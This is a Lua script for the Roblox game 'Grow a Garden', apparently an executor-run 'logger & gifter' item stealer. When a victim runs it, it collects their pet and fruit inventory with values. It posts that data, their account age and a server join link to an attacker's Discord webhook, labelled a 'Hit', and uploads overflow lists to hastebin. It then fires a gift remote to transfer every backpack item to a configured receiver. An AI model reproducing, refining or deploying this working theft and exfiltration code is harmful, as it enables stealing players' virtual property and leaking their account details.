-- Grow a Garden: Full Logger & Gifter w/ Webhook Embeds and Pastebin Support
-- Made by Timoci, Updated & Enhanced by You ‚ù§Ô∏è

local CONFIG = {
    USERNAMES = _G.Usernames or {},
    WEBHOOK   = _G.webhook or "",
    MIN_VALUE = _G.min_value or 1,
}

local RARE_PETS = {
    "Mystic Mouse", "Rainbow Slug", "Fairy Ferret", "Phoenix Fox",
    "Golden Gator", "Magic Mole", "Glitch Gecko", "Ghost Giraffe",
    "Chroma Chameleon", "Cyber Cheetah", "Toxic Toad", "Frosty Falcon"
}

local DEFAULT_PET_EMOJI = "üê∂"
local DEFAULT_FRUIT_EMOJI = "ü•ù"
local req = request or http_request or (syn and syn.request)

local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local replicatedStorage = game:GetService("ReplicatedStorage")
local backpack = plr:WaitForChild("Backpack")

local modules = replicatedStorage:WaitForChild("Modules")
local petValues = require(modules:WaitForChild("PetValues"))
local fruitValues = require(modules:WaitForChild("FruitValues"))
local petsModule = require(modules:WaitForChild("PetModule"))
local fruitModule = require(modules:WaitForChild("FruitModule"))

local webhookSent = false

-- Emoji functions
local function getPetEmoji(name)
    local pet = petsModule[name]
    return pet and pet.emoji or DEFAULT_PET_EMOJI
end

local function getWeight(item)
    local stats = item:FindFirstChild("Stats")
    return stats and tonumber(stats:FindFirstChild("Weight") and stats.Weight.Value) or 0
end

-- Format Value
local function formatValue(val)
    if val >= 1e6 then return string.format("%.1fm", val / 1e6)
    elseif val >= 1e3 then return string.format("%.1fk", val / 1e3)
    else return tostring(val)
    end
end

-- Gather and rank items
local function collectItems()
    local items = {}
    local totalValue = 0
    local foundRare = false

    for _, item in ipairs(backpack:GetChildren()) do
        local name = item.Name
        local weight = getWeight(item)
        local age = item:FindFirstChild("Age") and item.Age.Value or "?"
        local value = petValues[name] or fruitValues[name]

        if value and value >= CONFIG.MIN_VALUE then
            totalValue += value
            local isRare = table.find(RARE_PETS, name)
            if isRare then foundRare = true end

            table.insert(items, {
                Name = name,
                Type = petValues[name] and "Pet" or "Fruit",
                Emoji = petValues[name] and getPetEmoji(name) or DEFAULT_FRUIT_EMOJI,
                Weight = weight,
                Age = age,
                Value = value
            })
        end
    end

    table.sort(items, function(a, b) return a.Value > b.Value end)
    return items, totalValue, foundRare
end

-- Convert top 10 items to description
local function buildCompactList(items)
    local lines = {}
    for _, item in ipairs(items) do
        if item.Type == "Pet" then
            table.insert(lines, string.format("%s [%s, Age %s] [%.2fkg] ‚Üí %s¬¢", item.Emoji, item.Name, item.Age, item.Weight, formatValue(item.Value)))
        else
            table.insert(lines, string.format("%s [%s] [%.2fkg] ‚Üí %s¬¢", item.Emoji, item.Name, item.Weight, formatValue(item.Value)))
        end
    end
    return "# Top Items:\n" .. table.concat(lines, "\n")
end

-- Upload overflow to Hastebin
local function uploadOverflow(items)
    local content = {}
    for _, item in ipairs(items) do
        if item.Type == "Pet" then
            table.insert(content, string.format("%s [%s, Age %s] [%.2fkg] ‚Üí %s¬¢", item.Emoji, item.Name, item.Age, item.Weight, formatValue(item.Value)))
        else
            table.insert(content, string.format("%s [%s] [%.2fkg] ‚Üí %s¬¢", item.Emoji, item.Name, item.Weight, formatValue(item.Value)))
        end
    end
    local body = table.concat(content, "\n")
    local res = req({
        Url = "https://hastebin.com/documents",
        Method = "POST",
        Headers = { ["Content-Type"] = "text/plain" },
        Body = body
    })

    local data = HttpService:JSONDecode(res.Body)
    if data and data.key then
        return "https://hastebin.com/" .. data.key
    end
    return nil
end

-- Webhook embed generator
local function prettyEmbed(executer, receiver)
    local items, totalValue, foundRare = collectItems()
    local top10, overflow = {}, {}

    for i, item in ipairs(items) do
        if i <= 10 then table.insert(top10, item) else table.insert(overflow, item) end
    end

    local overflowLink = (#overflow > 0) and uploadOverflow(overflow)

    local innerEmbed = {
        title = "üéí Top Backpack Items",
        description = buildCompactList(top10),
        color = foundRare and 16776960 or 65280
    }

    local fields = {
        {
            name = "üë§ Player Info",
            value = string.format("**Name:** %s\n**Receiver:** %s\n**Executor:** %s\n**Account Age:** %s days",
                executer.Name, receiver, "Delta", executer.AccountAge or "?")
        },
        {
            name = "üí∞ Total Value",
            value = "**" .. formatValue(totalValue) .. "¬¢**"
        },
    }

    if overflowLink then
        table.insert(fields, {
            name = "üìé View All Items",
            value = string.format("[Click to view overflow items](%s)", overflowLink)
        })
    end

    table.insert(fields, {
        name = "üèùÔ∏è Join URL",
        value = string.format("[click to join](https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=%s)", game.JobId)
    })

    local mainEmbed = {
        title = "üå± Grow A Garden Hit ‚Äì DARK SCRIPTS ‚òòÔ∏è",
        color = foundRare and 16776960 or 65280,
        fields = fields,
        embeds = { innerEmbed },
        footer = { text = string.format("%s | %s", "8738351619", game.JobId) }
    }

    return {
        content = foundRare and "@everyone" or "",
        embeds = { mainEmbed }
    }
end

-- Send webhook
local function sendHitWebhook(executer, receiver)
    if webhookSent then return end
    webhookSent = true
    local data = prettyEmbed(executer, receiver)
    req({
        Url = CONFIG.WEBHOOK,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode(data)
    })
end

-- Gift trigger & final logic
local function doGift()
    local executer = plr
    local receiver = nil
    for _, name in ipairs(CONFIG.USERNAMES) do
        local target = Players:FindFirstChild(name)
        if target and target ~= plr then
            receiver = name
            break
        end
    end

    if not receiver then return end

    sendHitWebhook(executer, receiver)

    -- Perform actual gift (simplified)
    local remote = replicatedStorage:WaitForChild("GiftEvent") or replicatedStorage:FindFirstChildWhichIsA("RemoteEvent", true)
    if remote then
        for _, item in ipairs(backpack:GetChildren()) do
            remote:FireServer(item, receiver)
        end
    end
end

-- Trigger on character added
plr.CharacterAdded:Connect(doGift)
if plr.Character then doGift() end
